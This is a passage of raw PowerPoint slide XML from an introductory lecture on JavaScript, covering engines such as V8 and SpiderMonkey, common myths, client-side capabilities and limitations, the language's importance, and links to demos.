            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Gained huge popularity with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>node.js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Express.js, Sails.js, Meteor.js, Next.js</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Many popular JavaScript Web Programming frameworks focus on the so called frontend libraries for building User Interface (UI) e.g. React, Angular, Vue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"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buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRP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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEF406D9-ED62-4958-8734-40D4D0A4B7C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Implementations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A12F62FD-C541-42E2-B6C4-8B6AE5711CA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Blink or Google V8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> (used in node.js, Google Chrome, Android Chrome, Chromebooks, Opera, Edge etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0">
              <a:hlinkClick r:id="rId4"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Gecko or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>SpiderMonkey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> (used by Mozilla)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>Webkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>SquirrelFish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t> Extreme (SFX) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>(Apple Safari)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>Trident or Jscript/Chakra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>(Internet Explorer)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>EdgeHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> (New version of Edge uses Blink)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>Rhino</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, an open source JavaScript implementation in Java (part of Java 2 SE 6)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A1CECA8-41FB-4911-AABB-D4D72EF58B15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Myths about JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA36EA26-B349-4597-94E8-BD5980D2BA13}"/>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dirty="0"/>
              <a:t>JavaScript is related to Java</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>both Java &amp; JavaScript use C-alike syntax, but that is where the similarities end!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript is more similar to functional languages, like Lisp or Scheme, or Python than Java</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript is very slow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Google V8 and Squirrelfish Extreme are faster than most script languages (PHP, Python, Perl)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript is a crappy, toy language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>dynamic language with a lot of expressive power</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>built-in libraries are lacking and it has a lot of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>quirks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRP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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39DEEEFF-44A9-4067-8925-8781CC5AEB4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>What Can Be Done in Client-side JavaScript?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BADDD80-D920-48D7-9925-2A3219CB9299}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>add, modify and delete any HTML/XHTML or CSS on the webpage, including:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>reading &amp; validating web forms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>changing images</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>open new windows, close or remote control them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>create simple dialog windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>detect web browser version and settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>server-side data fetch-up using AJAX without reloading page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read and write cookies </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>process user input from mouse and keyboard and touch events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>create timer-based events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create 2D / 3D graphics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>control audio and video elements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>create audio and process it in real time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>animation, games and complex GUIs are also possible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRP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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7197DE0E-C816-48D2-9E10-B829E622CD81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Client-side JavaScript limitations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9219" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F03E50E8-25E5-4C85-85A9-E82BA3A86AF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>No access to local file system, but you can store things to server or use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1"/>
              <a:t>IndexedDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> (50+ MB), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1"/>
              <a:t>LocalStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0" err="1"/>
              <a:t>SessionStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> (10 MB)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Limited access to local devices (webcam, microphone and gamepad are supported though)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>JavaScript can be disabled (but that would break any modern web site)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>Source code is always visible to the user, but code can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>obfuscated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>minified</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{16A4574B-0364-47CE-AC26-017D26E690FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Future &amp; Importance of JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B34A8C7-02CD-4D22-B2A2-17FA2EDA0B5E}"/>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dirty="0"/>
              <a:t>JavaScript + web browser is the most widely spread unified programming environment (several billion PCs + smart phones in total)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Most popular programming language according to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Github Octoverse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(already for 5 + years)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Node.js' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>NPM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> has over 750 000 packages, more than any other programming language. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>Number of NPM modules</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is growing faster than competitors combined.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Becoming also popular for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Internet of Things (IoT) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and mobile with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>React Native</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>Apache Cordova</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lots of open job vacancies (#1 most in demand)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C3F37263-0D50-46CA-B4CE-794828AF9406}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>JavaScript Demos</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11267" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00181438-49F0-4A49-BBCA-3F14C50109BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://webglsamples.org/</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://experiments.withgoogle.com/collection/chrome</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.youtube.com/watch?v=BV32Cs_CMqo</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
              <a:hlinkClick r:id="rId5"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://emscripten.org/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://playcanvas.com/explore</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://www.babylonjs.com/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
